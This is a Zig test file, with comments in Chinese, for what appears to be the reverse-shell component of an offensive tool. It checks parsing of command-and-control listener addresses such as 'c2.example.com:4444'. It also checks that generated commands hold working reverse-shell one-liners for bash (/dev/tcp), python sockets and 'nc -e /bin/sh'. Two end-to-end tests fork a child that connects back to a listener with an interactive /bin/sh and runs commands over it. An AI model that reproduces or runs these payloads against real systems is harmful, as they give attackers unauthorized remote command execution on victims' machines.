const std = @import("std");
const testing = std.testing;
const runner = @import("runner.zig");

const linux = std.os.linux;

const is_linux = @import("builtin").os.tag == .linux;
// Linux 执行段按平台分支：mac 上以同签名 stub 占位（门控用例运行时跳过，
// 但编译期仍需分析通过——stub 提供同名 decl，见 sensitive_search 同款手法）
const session = if (is_linux) @import("session.zig") else struct {
    pub const STATUS_OK: u8 = 'C';
    pub const STATUS_FAIL: u8 = 'F';
    pub const Resolved = struct { head: ?*anyopaque = null };
    pub fn resolve(_: [:0]const u8, _: u16) anyerror!Resolved {
        return error.LinuxOnly;
    }
    pub fn childMain(_: runner.Variant, _: Resolved, _: ?[:0]const u8, _: u32, _: std.posix.fd_t) noreturn {
        unreachable;
    }
};

test "parseListener accepts host:port / domain / ipv6 bracket" {
    const l1 = try runner.parseListener("10.0.0.1:4444");
    try testing.expectEqualStrings("10.0.0.1", l1.host);
    try testing.expectEqual(@as(u16, 4444), l1.port);

    const l2 = try runner.parseListener("c2.example.com:8080");
    try testing.expectEqualStrings("c2.example.com", l2.host);
    try testing.expectEqual(@as(u16, 8080), l2.port);

    const l3 = try runner.parseListener("[::1]:4444");
    try testing.expectEqualStrings("::1", l3.host);
    try testing.expectEqual(@as(u16, 4444), l3.port);
}

test "parseListener rejects malformed input" {
    try testing.expectError(error.EmptyListener, runner.parseListener(""));
    try testing.expectError(error.BadListener, runner.parseListener("no-port"));
    try testing.expectError(error.BadListener, runner.parseListener(":4444"));
    try testing.expectError(error.BadPort, runner.parseListener("host:0"));
    try testing.expectError(error.BadPort, runner.parseListener("host:99999"));
    try testing.expectError(error.BadPort, runner.parseListener("host:abc"));
}

test "parseVariant and unknown input" {
    try testing.expectEqual(runner.Variant.native, runner.parseVariant("native").?);
    try testing.expectEqual(runner.Variant.bash, runner.parseVariant("BASH").?);
    try testing.expectEqual(runner.Variant.python, runner.parseVariant("python").?);
    try testing.expectEqual(runner.Variant.nc, runner.parseVariant("nc").?);
    try testing.expect(runner.parseVariant("powershell") == null);
}

test "buildShellCommand interpolates host and port per variant" {
    const allocator = testing.allocator;
    const l = runner.Listener{ .host = "10.1.2.3", .port = 4444 };

    try testing.expect(try runner.buildShellCommand(allocator, .native, l) == null);

    const bash = (try runner.buildShellCommand(allocator, .bash, l)).?;
    defer allocator.free(bash);
    try testing.expect(std.mem.indexOf(u8, bash, "bash -c 'exec bash -i >& /dev/tcp/10.1.2.3/4444 0>&1'") != null);

    const python = (try runner.buildShellCommand(allocator, .python, l)).?;
    defer allocator.free(python);
    try testing.expect(std.mem.indexOf(u8, python, "s.connect(('10.1.2.3',4444))") != null);

    const nc = (try runner.buildShellCommand(allocator, .nc, l)).?;
    defer allocator.free(nc);
    try testing.expect(std.mem.indexOf(u8, nc, "nc 10.1.2.3 4444 -e /bin/sh") != null);
}

// ---- Linux 端到端：fork + connect + /bin/sh 会话（CI ubuntu 真跑） ----

fn monoClock() i128 {
    var ts: std.c.timespec = undefined;
    if (is_linux) {
        _ = std.c.clock_gettime(.MONOTONIC, &ts);
    } else {
        _ = std.c.clock_gettime(1, &ts);
    }
    return @as(i128, ts.sec) * std.time.ns_per_s + ts.nsec;
}

const E2eCtx = struct {
    // 读到 deadline 或包含 marker 为止；返回累计输出
    fn readUntil(fd: std.posix.fd_t, deadline_ns: i128, marker: []const u8, buf: []u8) !usize {
        var total: usize = 0;
        while (monoClock() < deadline_ns and total < buf.len) {
            if (std.mem.indexOf(u8, buf[0..total], marker) != null) return total;
            var pfds = [_]std.posix.pollfd{.{ .fd = fd, .events = std.posix.POLL.IN, .revents = 0 }};
            const n = std.posix.poll(&pfds, 300) catch 0;
            if (n == 0) continue;
            const r = std.posix.read(fd, buf[total..]) catch break;
            if (r == 0) break;
            total += r;
        }
        return total;
    }
};

// 0.16 的 std.posix 已剥离网络函数，监听/收发一律走 std.os.linux 裸包装
fn ok(rc: usize) bool {
    return @as(isize, @bitCast(rc)) >= 0;
}

fn makeListener() !std.posix.fd_t {
    const fd_raw = linux.socket(linux.AF.INET, linux.SOCK.STREAM | linux.SOCK.CLOEXEC, 0);
    if (!ok(fd_raw)) return error.SocketFailed;
    const fd: std.posix.fd_t = @intCast(fd_raw);
    errdefer _ = linux.close(fd);
    var addr = std.mem.zeroes(linux.sockaddr.in);
    addr.family = linux.AF.INET;
    addr.port = 0; // INADDR_ANY:0 由内核分配
    if (!ok(linux.bind(fd, @ptrCast(&addr), @sizeOf(linux.sockaddr.in)))) return error.BindFailed;
    if (!ok(linux.listen(fd, 1))) return error.ListenFailed;
    return fd;
}

fn listenerPort(fd: std.posix.fd_t) u16 {
    var addr: linux.sockaddr.in = undefined;
    var len: linux.socklen_t = @sizeOf(linux.sockaddr.in);
    _ = linux.getsockname(fd, @ptrCast(&addr), &len);
    return std.mem.bigToNative(u16, addr.port);
}

fn writeAll(fd: std.posix.fd_t, bytes: []const u8) !void {
    var off: usize = 0;
    while (off < bytes.len) {
        const r = linux.write(fd, bytes.ptr + off, bytes.len - off);
        if (@as(isize, @bitCast(r)) <= 0) return error.WriteFailed;
        off += @intCast(r);
    }
}

// 端到端回归：native 变体在目标进程内 fork + connect + dup2 + /bin/sh，
// listener 侧（测试进程）应收到连接并能交互执行命令。
test "e2e native variant connects back and executes commands" {
    if (!is_linux) return error.SkipZigTest;

    const lfd: std.posix.fd_t = try makeListener();
    defer _ = linux.close(lfd);
    const port = listenerPort(lfd);

    const resolved = try session.resolve("127.0.0.1", port);
    // 解析结果按插件约定不 free（子进程 COW 只读）

    var fds = [2]std.posix.fd_t{ -1, -1 };
    if (linux.pipe2(&fds, .{ .CLOEXEC = true }) != 0) return error.PipeFailed;

    const pid_raw = linux.fork();
    if (@as(isize, @bitCast(pid_raw)) < 0) return error.ForkFailed;
    const pid: std.posix.pid_t = @intCast(pid_raw);
    if (pid == 0) {
        _ = linux.close(fds[0]);
        session.childMain(.native, resolved, null, 5, fds[1]);
    }
    // 父进程关写端：否则子进程 exec 后 EOF 永不到达，状态轮询超时
    _ = linux.close(fds[1]);
    defer {
        var status: u32 = 0;
        _ = linux.waitpid(pid, &status, 0);
    }

    // 状态字节：'C' = connect 成功
    var status: u8 = 0;
    var pfds = [_]std.posix.pollfd{.{ .fd = fds[0], .events = std.posix.POLL.IN, .revents = 0 }};
    const n = std.posix.poll(&pfds, 5000) catch 0;
    try testing.expect(n > 0);
    _ = try std.posix.read(fds[0], @ptrCast(&status));
    _ = linux.close(fds[0]);
    try testing.expectEqual(session.STATUS_OK, status);

    // listener 侧接受连接，下发命令并读取执行输出
    const conn_raw = linux.accept(lfd, null, null);
    if (!ok(conn_raw)) return error.AcceptFailed;
    const conn: std.posix.fd_t = @intCast(conn_raw);
    defer _ = linux.close(conn);
    const deadline = monoClock() + 8 * std.time.ns_per_s;
    try writeAll(conn, "echo rsv-$((40+2))\n");
    var buf: [512]u8 = undefined;
    const got = try E2eCtx.readUntil(conn, deadline, "rsv-42", &buf);
    try testing.expect(std.mem.indexOf(u8, buf[0..got], "rsv-42") != null);

    _ = try writeAll(conn, "exit\n");
}

// bash 变体（/dev/tcp）端到端：命令串经 /bin/sh -c → bash 连回
test "e2e bash variant connects back via /dev/tcp" {
    if (!is_linux) return error.SkipZigTest;

    const lfd: std.posix.fd_t = try makeListener();
    defer _ = linux.close(lfd);
    const port = listenerPort(lfd);

    const cmd = try runner.buildShellCommand(std.heap.c_allocator, .bash, .{ .host = "127.0.0.1", .port = port });
    // cmd 按插件约定派生后不 free（子进程 COW 只读）

    var fds = [2]std.posix.fd_t{ -1, -1 };
    if (linux.pipe2(&fds, .{ .CLOEXEC = true }) != 0) return error.PipeFailed;

    const pid_raw = linux.fork();
    if (@as(isize, @bitCast(pid_raw)) < 0) return error.ForkFailed;
    const pid: std.posix.pid_t = @intCast(pid_raw);
    if (pid == 0) {
        _ = linux.close(fds[0]);
        session.childMain(.bash, .{ .head = null }, cmd, 5, fds[1]);
    }
    // 父进程关写端：否则子进程 exec 后 EOF 永不到达，状态轮询超时
    _ = linux.close(fds[1]);
    defer {
        var status: u32 = 0;
        _ = linux.waitpid(pid, &status, 0);
    }

    // EOF = exec 成功（CLOEXEC 写端关闭）
    var pfds = [_]std.posix.pollfd{.{ .fd = fds[0], .events = std.posix.POLL.IN, .revents = 0 }};
    const n = std.posix.poll(&pfds, 5000) catch 0;
    try testing.expect(n > 0);
    var byte: u8 = 0;
    const r = try std.posix.read(fds[0], @ptrCast(&byte));
    _ = linux.close(fds[0]);
    try testing.expectEqual(@as(usize, 0), r);

    const conn_raw = linux.accept(lfd, null, null);
    if (!ok(conn_raw)) return error.AcceptFailed;
    const conn: std.posix.fd_t = @intCast(conn_raw);
    defer _ = linux.close(conn);
    const deadline = monoClock() + 8 * std.time.ns_per_s;
    try writeAll(conn, "echo bsh-$((30+3))\n");
    var buf: [512]u8 = undefined;
    const got = try E2eCtx.readUntil(conn, deadline, "bsh-33", &buf);
    try testing.expect(std.mem.indexOf(u8, buf[0..got], "bsh-33") != null);

    _ = try writeAll(conn, "exit\n");
}
